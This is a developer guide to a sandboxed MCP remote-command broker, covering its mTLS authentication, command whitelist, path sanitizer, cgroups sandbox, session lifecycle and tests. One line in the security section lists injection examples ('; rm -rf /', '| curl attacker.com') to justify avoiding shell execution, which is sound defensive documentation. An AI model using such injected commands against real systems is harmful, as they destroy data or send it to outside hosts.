# OpenClaw Remote Broker MCP — Developer Guide

Architecture decisions, module interfaces, extension points, and testing strategy for contributors.

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Module Reference](#module-reference)
- [Adding a New Tool](#adding-a-new-tool)
- [Adding a New Command to the Whitelist](#adding-a-new-command-to-the-whitelist)
- [Configuration Schema](#configuration-schema)
- [Security Internals](#security-internals)
- [Session Lifecycle](#session-lifecycle)
- [Testing](#testing)
- [Design Decisions](#design-decisions)

---

## Architecture Overview

```
main.py (FastMCP server)
  │
  ├── config/loader.py          Loads server.yaml + policy.yaml → Pydantic models
  ├── security/auth.py          mTLS cert validation → ClientIdentity
  ├── security/sanitizer.py     Path canonicalization + command whitelist
  ├── security/sandbox.py       cgroups v2 + unprivileged user preexec
  ├── session/manager.py        Session create/lookup/kill/cleanup
  ├── tools/command.py          Subprocess execution (argv, no shell)
  ├── tools/filesystem.py       File read/write/list with path validation
  ├── tools/system.py           psutil-based system info + process mgmt
  └── audit/logger.py           structlog JSON lines
```

**Dependency flow**: `main.py` wires everything. Tools depend on `session/manager.py` and `security/sanitizer.py`. Session manager optionally uses `security/sandbox.py` for cgroups. All modules depend on `config/models.py` for types.

### Why FastMCP?

The MCP Python SDK offers three server APIs. We chose **FastMCP** because:

1. Decorator-based tool registration (`@mcp.tool()`) auto-generates JSON schemas from Python type hints
2. Pydantic return types produce structured `outputSchema` automatically
3. Built-in Streamable HTTP transport (the modern MCP standard, replacing legacy SSE)
4. `stateless_http=False` gives us session persistence for maintaining working directory across calls

For lower-level control (e.g., custom input validation before schema generation), the `Server` low-level API is available but not needed for v1.

---

## Module Reference

### `config/models.py`

All configuration is modeled with Pydantic `BaseModel` subclasses. Two top-level types:

- **`ServerConfig`** — wraps `ServerBlock` (host, port, TLS, logging, sessions, timeouts, sandbox)
- **`PolicyConfig`** — wraps `PolicyBlock` (allowed_commands, allowed_paths, blocked_paths, file_limits, resource_limits, confirmation_gates)

Key nested models:
- `CommandPolicy` — per-command rules (executable path, max_args, allowed_prefixes, requires_confirmation, resource_override)
- `ResourceLimits` — cgroups v2 values (cpu_quota_us, memory_max, pids_max, io_weight)

### `config/loader.py`

Three functions:
- `load_server_config(path)` → `ServerConfig`
- `load_policy_config(path)` → `PolicyConfig`
- `load_configs(config_dir)` → `(ServerConfig, PolicyConfig)` — convenience wrapper

All raise `FileNotFoundError` or `ValueError` on bad input. Pydantic handles type validation.

### `security/auth.py`

- **`MTLSValidator(ca_cert_path)`** — loads CA cert, provides `validate(cert_pem) → ClientIdentity`
- **`ClientIdentity`** — frozen dataclass with `cn`, `organization`, `fingerprint`, `not_before`, `not_after`
- **`create_ssl_context(...)`** — builds `ssl.SSLContext` with `CERT_REQUIRED` for mTLS

The validation chain: parse cert → check expiry → verify CA signature → extract DN.

### `security/sanitizer.py`

- **`PathSanitizer(allowed_patterns, blocked_patterns)`** — `sanitize(path) → SanitizedPath`
  - Uses `os.path.realpath()` to resolve symlinks
  - Blocked patterns checked first (deny wins)
  - `_path_matches()` handles `/**` suffix correctly (matches base dir + children)
- **`CommandSanitizer(policy)`** — `validate(argv) → ValidatedCommand`
  - Checks whitelist, arg count, subcommand prefixes
  - Returns argv with full executable path substituted

### `security/sandbox.py`

- **`CGroupManager(base_path)`** — creates per-session cgroup directories, applies resource limits
  - `create_session_cgroup(id, limits) → CGroupContext`
  - `destroy_session_cgroup(id)` — kills all processes, removes directory
  - `is_available()` — checks `/sys/fs/cgroup/cgroup.controllers` exists
- **`CGroupContext`** — `write_pid()`, `kill_all()`, `remove()`
- **`UserContext(username)`** — looks up user via `pwd.getpwnam`, provides `get_env()` and `preexec_fn()`
- **`make_preexec_fn(user_ctx, cgroup_ctx, working_dir)`** — returns a function for `subprocess.Popen(preexec_fn=...)` that: moves PID to cgroup → drops groups → setgid → setuid → chdir → disable core dumps

### `session/manager.py`

- **`SessionManager(config, cgroup_manager)`** — async lifecycle
  - `create_session(id, working_dir, env, client_identity) → Session`
  - `get_session(id) → Session | None` (auto-touches last_activity)
  - `kill_session(id, force) → bool`
  - `start()` / `stop()` — background cleanup loop
- **`Session`** — dataclass with `processes: dict[int, ProcessRecord]`, `lock`, `cgroup`
  - `touch()`, `is_expired(max_age)`, `add_process()`, `remove_process()`, `kill_all_processes()`

### `tools/base.py`

- **`ErrorCode`** — enum of all error codes (AUTH_001, SESSION_001, POLICY_001, CMD_001, FILE_001, etc.)
- **`ToolResult`** — base Pydantic model: `success`, `error_code`, `error_message`, `error_details`
- **`ToolError`** — exception with `code`, `details`; has `to_result()` method

### `tools/command.py`

- **`CommandExecutor(session_manager, policy, user_ctx, cgroup_manager)`** — `execute(session_id, argv, timeout, stdin_input, confirm) → CommandResult`
  - Validates session → validates whitelist → checks confirmation gate → applies resource override → builds preexec_fn → `asyncio.create_subprocess_exec` → captures stdout/stderr with size limits
  - **Confirmation gate**: if `CommandPolicy.requires_confirmation` is true, execution is blocked unless `confirm=True` is passed
  - **Resource override**: if `CommandPolicy.resource_override` is set, a temporary cgroup is created with per-command limits (memory, CPU, PIDs). Cleaned up after execution.
- **`CommandResult(ToolResult)`** — adds `exit_code`, `stdout`, `stderr`, `duration_ms`, `pid`, truncation flags

### `tools/filesystem.py`

- **`FileSystemTools(session_manager, policy)`**
  - `read_file(session_id, path, offset, limit) → FileContent`
  - `write_file(session_id, path, content, mode) → FileWriteResult`
  - `list_directory(session_id, path, include_hidden) → DirectoryList`
  - `download_file(session_id, path, chunk_size, offset) → DownloadResult` — chunked download with SHA-256
  - `upload_file(session_id, path, chunk_data, transfer_id, chunk_offset, is_last) → UploadResult` — chunked upload with atomic write
  - `_resolve(session, path) → Path` — resolves relative to working_dir, validates via PathSanitizer
  - `_file_hash(path) → str` — async SHA-256 of full file

**Chunked transfer design**: Downloads return base64 chunks with `is_complete` flag. Uploads accumulate in a `.tmp` file, then atomically rename on `is_last`. Both use SHA-256 for integrity verification. Transfer state for uploads is stored in a module-level dict (`_UPLOAD_TRANSFERS`).

### `tools/system.py`

- **`SystemTools(session_manager, cgroup_manager)`**
  - `get_system_info() → SystemInfo` — psutil-based CPU/memory/disk
  - `get_process_list(session_id) → ProcessList` — cgroup-scoped or user-scoped
  - `kill_process(session_id, pid, sig) → KillResult` — ownership verified against session

### `audit/logger.py`

- **`AuditLogger(log_path, console)`** — wraps structlog with JSON renderer
  - `log(event_type, session_id, client_dn, tool_name, arguments, ...)` — writes JSON line
  - `_redact(data)` — strips password/token/secret/key fields
  - `close()` — flushes and closes file handle

---

## Adding a New Tool

1. **Define the result model** in `tools/base.py` or the relevant tool module:

```python
class MyToolResult(ToolResult):
    custom_field: str = ""
    count: int = 0
```

2. **Implement the logic** as a class method:

```python
class MyTools:
    def __init__(self, session_manager: SessionManager, policy: PolicyConfig):
        self._sessions = session_manager
        self._policy = policy

    async def my_operation(self, session_id: str, arg: str) -> MyToolResult:
        session = self._sessions.get_session(session_id)
        if session is None:
            raise ToolError(ErrorCode.SESSION_NOT_FOUND, f"Session '{session_id}' not found")
        # ... logic ...
        return MyToolResult(custom_field="done", count=1)
```

3. **Register in `main.py`** inside `create_server()`:

```python
@mcp.tool()
async def my_operation(session_id: str, arg: str) -> dict[str, Any]:
    """Short description shown to the MCP client.

    Args:
        session_id: Active session.
        arg: Description of the argument.
    """
    tools = _require(_my_tools, "MyTools")
    try:
        result = await tools.my_operation(session_id, arg)
        return result.model_dump()
    except ToolError as exc:
        return exc.to_result().model_dump()
```

4. **Initialize the tool instance** in `_lifespan()`:

```python
global _my_tools
_my_tools = MyTools(_session_mgr, _policy_config)
```

5. **Add tests** in `tests/`.

---

## Adding a New Command to the Whitelist

Edit `config/policy.yaml`:

```yaml
policy:
  allowed_commands:
    # ... existing commands ...
    mycommand:
      executable: "/usr/bin/mycommand"
      max_args: 15
      allowed_prefixes:      # optional: restrict subcommands
        - "build"
        - "test"
      requires_confirmation: false
      resource_override:     # optional: custom limits
        memory_max: "256M"
        pids_max: 16
```

No code changes needed — the policy is loaded at startup.

---

## Configuration Schema

### Server config (`server.yaml`)

| Path | Type | Default | Description |
|------|------|---------|-------------|
| `server.host` | str | `"0.0.0.0"` | Bind address |
| `server.port` | int | `8443` | Bind port |
| `server.tls.cert_path` | Path | — | Server certificate PEM |
| `server.tls.key_path` | Path | — | Server private key PEM |
| `server.tls.ca_cert_path` | Path | — | CA cert for client validation |
| `server.tls.min_version` | str | `"TLSv1.3"` | Minimum TLS version |
| `server.logging.level` | str | `"INFO"` | Log level |
| `server.logging.audit_log` | Path | — | Audit log file path |
| `server.sessions.max_session_age` | int | `1800` | Inactivity timeout (seconds) |
| `server.sessions.max_concurrent` | int | `10` | Max simultaneous sessions |
| `server.sessions.cleanup_interval` | int | `60` | Cleanup sweep interval (seconds) |
| `server.timeouts.command_default` | int | `30` | Default command timeout |
| `server.timeouts.command_max` | int | `300` | Maximum allowed timeout |
| `server.sandbox.unprivileged_user` | str | `"oc-runner"` | OS user for subprocesses |
| `server.sandbox.cgroup_base` | Path | `"/sys/fs/cgroup/oc-broker"` | Base cgroup path |
| `server.sandbox.enable_cgroups` | bool | `true` | Enable cgroup sandboxing |

### Policy config (`policy.yaml`)

| Path | Type | Description |
|------|------|-------------|
| `policy.allowed_commands.<name>.executable` | str | Full path to binary |
| `policy.allowed_commands.<name>.max_args` | int | Maximum argument count |
| `policy.allowed_commands.<name>.allowed_prefixes` | list[str] \| null | Restrict subcommands |
| `policy.allowed_commands.<name>.requires_confirmation` | bool | Gate destructive ops |
| `policy.allowed_commands.<name>.resource_override` | object \| null | Per-command cgroup limits |
| `policy.allowed_paths` | list[str] | Glob patterns for workspace access |
| `policy.blocked_paths` | list[str] | Glob patterns always denied |
| `policy.file_limits.max_read_size` | int | Max bytes for file reads |
| `policy.file_limits.max_write_size` | int | Max bytes for file writes |
| `policy.resource_limits.cpu_quota_us` | int | cgroup cpu.max quota |
| `policy.resource_limits.memory_max` | str | cgroup memory.max |
| `policy.resource_limits.pids_max` | int | cgroup pids.max |

---

## Security Internals

### Policy enforcement chain

Every tool call passes through this chain in order:

1. **Transport** — mTLS handshake validates client certificate
2. **Session** — `session_manager.get_session()` checks session exists and not expired
3. **Path** — `PathSanitizer.sanitize()` canonicalizes → checks blocked → checks allowed
4. **Command** — `CommandSanitizer.validate()` checks whitelist → arg count → subcommand prefix
5. **Confirmation** — if `requires_confirmation`, raises `POLICY_CONFIRMATION_REQUIRED`
6. **Sandbox** — `make_preexec_fn()` drops privileges + joins cgroup before exec
7. **Audit** — every step logged via `AuditLogger`

### Privilege model

```
Broker process (runs as service user, not root)
  │
  ├── Can manage cgroups (needs write access to /sys/fs/cgroup)
  ├── Can bind to port 8443
  │
  └── fork/exec → Subprocess
       ├── preexec: write PID to cgroup.procs
       ├── preexec: setgroups([]) → setgid → setuid (to oc-runner)
       ├── preexec: chdir(working_dir)
       ├── preexec: prctl(PR_SET_DUMPABLE, 0)
       └── Runs as oc-runner with cgroup resource limits
```

### Why no shell=True?

Shell interpretation enables command injection (`; rm -rf /`, `$(malicious)`, `| curl attacker.com`). By using `asyncio.create_subprocess_exec(*argv)` with pre-validated argv arrays, we eliminate this entire class of vulnerability.

---

## Session Lifecycle

```
create_session()
  ├── Validate working_dir exists
  ├── Create cgroup: /sys/fs/cgroup/oc-broker/session-{id}/
  ├── Apply resource limits to cgroup
  └── Store in memory dict

execute_command() / other tools
  ├── Lookup session (auto-touches last_activity)
  ├── Validate command/path
  ├── Spawn subprocess in session cgroup
  ├── Track PID in session.processes
  └── Return result

Background cleanup (every 60s)
  ├── Check last_activity vs max_session_age
  └── Kill expired sessions

kill_session()
  ├── SIGTERM all tracked processes
  ├── Wait 2s grace period
  ├── SIGKILL survivors
  ├── Remove cgroup directory
  └── Remove from memory dict
```

Sessions are **in-memory only** (no persistence). If the broker restarts, all sessions are lost. This is intentional for v1 — single-user, no crash recovery needed.

---

## Testing

### Run all tests

```bash
uv run pytest tests/ -v
```

### Test structure

| File | What it tests | Approach |
|------|--------------|----------|
| `test_config.py` | YAML loading, validation errors | Direct function calls |
| `test_sanitizer.py` | Path validation, command whitelist | Unit tests with real policy |
| `test_command.py` | Command execution, file read/write | Integration with temp sessions |
| `test_filesystem.py` | File append mode | Integration with temp sessions |
| `test_sandbox.py` | CGroupManager, UserContext | Mocked (no real cgroups needed) |
| `test_phase2.py` | Download/upload, confirmation gate, resource quotas | Integration with temp sessions |

### Writing new tests

For **tool tests**, use the `tmp_path` pytest fixture and create a policy that allows it:

```python
@pytest.mark.asyncio
async def test_my_feature(session_manager: SessionManager, tmp_path: Path):
    policy = PolicyConfig(
        policy=PolicyBlock(
            allowed_paths=[f"{tmp_path}/**"],
            # ...
        )
    )
    await session_manager.create_session("test", tmp_path, None, None)
    # ... test logic ...
    await session_manager.kill_session("test")
```

For **sandbox tests**, mock `CGroupManager` since test environments may not have cgroups v2.

---

## Design Decisions

| Decision | Choice | Why |
|----------|--------|-----|
| MCP API | FastMCP | Decorator-based, auto-schema, simplest API |
| Transport | Streamable HTTP | Modern MCP standard; SSE is legacy |
| Process exec | `create_subprocess_exec` | No shell interpretation = no injection |
| Sessions | In-memory dict | v1 simplicity; single-user, no crash recovery |
| Config | Pydantic + YAML | Type-safe validation, human-editable |
| Logging | structlog JSON lines | Machine-parseable audit trail |
| Sandbox | cgroups v2 + unprivileged user | Kernel-enforced limits, not advisory |
| Path matching | fnmatch + `/**` base-dir fix | Standard glob semantics + directory self-match |
| Error handling | ToolError → ToolResult | Structured errors, never leak internals |
| File I/O | aiofiles | Non-blocking async file operations |
| File transfer | Chunked base64 | Works over MCP tool calls, no separate HTTP endpoints |
| Confirmation | `confirm` param on execute_command | Explicit opt-in for destructive commands |
| Resource quotas | Per-command cgroup | Override default limits for heavy commands (e.g. Python) |
